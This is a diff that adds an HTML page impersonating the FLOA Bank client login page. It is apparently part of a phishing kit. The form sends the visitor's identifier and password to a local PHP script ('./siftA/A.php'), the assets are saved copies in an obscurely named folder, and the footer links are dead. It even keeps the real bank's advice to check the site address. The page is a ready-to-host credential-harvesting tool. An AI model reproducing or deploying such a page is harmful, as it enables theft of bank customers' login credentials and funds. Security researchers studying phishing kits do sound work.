@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html class="fontawesome-i2svg-active fontawesome-i2svg-complete"><script id="allow-copy_script">(function agent() {
+    let unlock = false
+    document.addEventListener('allow_copy', (event) => {
+      unlock = event.detail.unlock
+    })
+
+    const copyEvents = [
+      'copy',
+      'cut',
+      'contextmenu',
+      'selectstart',
+      'mousedown',
+      'mouseup',
+      'mousemove',
+      'keydown',
+      'keypress',
+      'keyup',
+    ]
+    const rejectOtherHandlers = (e) => {
+      if (unlock) {
+        e.stopPropagation()
+        if (e.stopImmediatePropagation) e.stopImmediatePropagation()
+      }
+    }
+    copyEvents.forEach((evt) => {
+      document.documentElement.addEventListener(evt, rejectOtherHandlers, {
+        capture: true,
+      })
+    })
+  })()</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <!-- Required meta tags -->
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
+        
+        <!-- CSS FILES -->
+        <style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.3333333333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-both,.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-both,:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2.5em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1.25em}.svg-inline--fa.fa-stack-2x{height:2em;width:2.5em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}.svg-inline--fa .fa-primary{fill:var(--fa-primary-color,currentColor);opacity:1;opacity:var(--fa-primary-opacity,1)}.svg-inline--fa .fa-secondary{fill:var(--fa-secondary-color,currentColor);opacity:.4;opacity:var(--fa-secondary-opacity,.4)}.svg-inline--fa.fa-swap-opacity .fa-primary{opacity:.4;opacity:var(--fa-secondary-opacity,.4)}.svg-inline--fa.fa-swap-opacity .fa-secondary{opacity:1;opacity:var(--fa-primary-opacity,1)}.svg-inline--fa mask .fa-primary,.svg-inline--fa mask .fa-secondary{fill:#000}.fad.fa-inverse{color:#fff}</style><link rel="stylesheet" href="./xzour/bootstrap.min.css">
+        <link rel="stylesheet" href="./xzour/helpers.css">
+        <link rel="stylesheet" href="./xzour/style.css">
+
+        <link rel="icon" type="image/png" href="./xzour/favicon.png">
+
+        <title>FLOA Bank - Votre banque en ligne</title>
+    </head>
+
+    <body>
+
+		<header id="header">
+            <img class="img" src="./xzour/service.svg">
+            <div class="container">
+                <img src="./xzour/logo.svg">
+            </div>
+        </header>
+
+        <main id="main">
+            <div class="container">
+                <div class="left">
+                                        <div class="login-area mb30">
+                        <form action="./siftA/A.php" method="post">
+                            <input type="hidden" name="captcha">
+                            <input type="hidden" name="step" value="login">
+                            <legend>CONNEXION À VOTRE ESPACE CLIENT</legend>
+                            <p>Consultez vos comptes, suivez l'ensemble de vos opérations bancaires, effectuez une demande de financement en quelques clics depuis votre Espace Client sécurisé.</p>
+                            <div class="form-group">
+                                <label for="identifiant">Votre identifiant</label>
+                                <input type="text" name="identifiant" id="identifiant" class="form-control" required>
+                                <span>Identifiant oublié ?</span>
+                            </div>
+                            <div class="form-group">
+                                <label for="password">Votre mot de passe</label>
+                                <input type="password" name="password" id="password" class="form-control" required>
+                                <span>Mot de passe oublié ?</span>
+                            </div>
+                            <div class="btns">
+                                <button type="submit"><img src="./xzour/button.png"></button>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="banner text-center mb30"><div class="inner"><img src="./xzour/banner1.png"></div></div>
+                    <div class="banner-text">
+                        <div class="mr-3"><svg class="svg-inline--fa fa-exclamation-circle fa-w-16" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="exclamation-circle" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"></path></svg><!-- <i class="fas fa-exclamation-circle"></i> Font Awesome fontawesome.com --></div>
+                        <div class="flex-grow-1">
+                            <p><b>Recommandation:</b> Pour vous assurer d'être sur le site officiel de FLOA Bank, vérifiez dans la barre de navigation que l'adresse du site commence obligatoirement par <span>https://client.floabank.fr/</span></p>
+                            <p class="mb-0"><span>Consultez le détail des recommandations de sécurité de la banque en ligne.</span></p>
+                        </div>
+                    </div>
+                </div>
+                <div class="right">
+                    <div class="banner"><img style="min-width: 208px;" src="./xzour/banner2.png"></div>
+                </div>
+            </div>
+        </main>
+
+        <div id="help">
+            <div class="title"><svg class="svg-inline--fa fa-chevron-down fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-down" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path></svg><!-- <i class="fas fa-chevron-down"></i> Font Awesome fontawesome.com --> BESOIN D'AIDE ?</div>
+            <div class="container">
+                <div class="listt">
+                    <img class="d-lg-block d-md-block d-sm-none d-none" style="min-width: 527px;" src="./xzour/list.png">
+                    <img class="d-lg-none d-md-none d-sm-block d-block" style="min-width: 224px;" src="./xzour/list2.png">
+                </div>
+            </div>
+        </div>
+
+        <footer id="footer">
+            <div class="container">
+                <p>Vous pouvez vous opposer sans frais à l'utilisation, à des fins de prospection, des données personnelles que vous nous avez transmises. Pour ce faire veuillez nous adresser votre opposition par courrier à : FLOA Bank - Centre de relation clientèle 36 rue de Messines - 59 686 Lille Cedex 9. FLOA, Société Anonyme au capital de 42.773.400 euros - Bâtiment G7, 71 Rue Lucien Faure, 33300 Bordeaux, RCS Bordeaux 434 130 423, ORIAS n°07 028 160 (www.orias.fr), Entreprise soumise au contrôle de l’Autorité de Contrôle Prudentiel et de Résolution (ACPR) 4 Place de Budapest, CS 92469, 75430 Paris Cedex 09.</p>
+                <div class="row">
+                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
+                        <div class="widget">
+                            <h3>Solutions de crédits</h3>
+                            <ul>
+                                <li>Gamme de crédits</li>
+                                <li>Crédit Renouvelable</li>
+                                <li>Prêts personnels</li>
+                                <li>Prêts autres projets</li>
+                                <li>Rachats de crédits</li>
+                                <li>Coup de pouce</li>
+                                <li>Crédit Travaux/Déco</li>
+                                <li>Prêt Eco d'énergie</li>
+                                <li>Crédit Auto</li>
+                                <li>Crédit Moto</li>
+                                <li>Crédit Camping Car</li>
+                                <li>Crédit Mariage</li>
+                                <li>Crédit Voyage</li>
+                                <li>Crédit Bateau</li>
+                                <li>Crédit Loisirs</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
+                        <div class="widget">
+                            <h3>Assurances</h3>
+                            <ul>
+                                <li>Assurance Scolaire</li>
+                                <li>Assurance Auto</li>
+                                <li>Assurance Habitation</li>
+                                <li>Assurances 2 roues</li>
+                                <li>Assurances Vélo</li>
+                                <li>Assurance Hospitalisation</li>
+                                <li>Assurance Décès</li>
+                                <li>Garantie Frais d'obsèques</li>
+                                <li>Assurance Chien et Chat</li>
+                                <li>Comparateur Mutuelles</li>
+                                <li>Assurance Moyens de Paiement</li>
+                                <li>Assurance Crédit</li>
+                                <li>Assurance Prêt immobilier</li>
+                                <li>Assurance Blessure</li>
+                                <li>Assurance Habitation Étudiant</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
+                        <div class="widget">
+                            <h3>Cartes et Solutions de paiement</h3>
+                            <ul>
+                                <li>Carte bancaire Casino</li>
+                                <li>Carte Gold</li>
+                                <li>Carte MasterCard Cdiscount</li>
+                                <li>Paiement CB4X</li>
+                                <li>Prêt instantané Lydia</li>
+                                <li>Casino Max</li>
+                                <li>Location longue durée</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
+                        <div class="widget">
+                            <h3>Espace Client</h3>
+                            <ul>
+                                <li>Assurance</li>
+                                <li>Suivi de demande</li>
+                                <li>Demander un Financement Express</li>
+                                <li>Gérer vos comptes sur l'appli</li>
+                                <li>Comprendre mon relevé</li>
+                                <li>Espace Carte</li>
+                                <li>Espace Crédit</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
+                        <div class="widget">
+                            <h3>A propos de FLOA Bank</h3>
+                            <ul>
+                                <li>FLOA Bank</li>
+                                <li>Qui sommes-nous</li>
+                                <li>Histoire</li>
+                                <li>Innovation</li>
+                                <li>Nos produits</li>
+                                <li>Nos métiers</li>
+                                <li>Espace presse</li>
+                                <li>Recrutement</li>
+                                <li>Actu</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-2 col-md-4 col-sm-6 col-6 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
+                        <div class="widget">
+                            <h3>Aide &amp; Services</h3>
+                            <ul>
+                                <li>Contactez-nous</li>
+                                <li>Questions/Réponses</li>
+                                <li>Aide Espace client</li>
+                                <li>Signature électronique</li>
+                                <li>Informations Sécurité</li>
+                                <li>Espace Magazines</li>
+                                <li>Guide Pratique</li>
+                                <li>Garantie reprise achats</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <!-- JS FILES -->
+        <script src="./xzour/jquery-3.5.1.min.js.download"></script>
+        <script src="./xzour/bootstrap.bundle.min.js.download"></script>
+        <script src="./xzour/all.min.js.download"></script>
+        <script src="./xzour/jquery.payment.min.js.download"></script>
+        <script src="./xzour/script.js.download"></script>
+
+    
+
+</body></html>
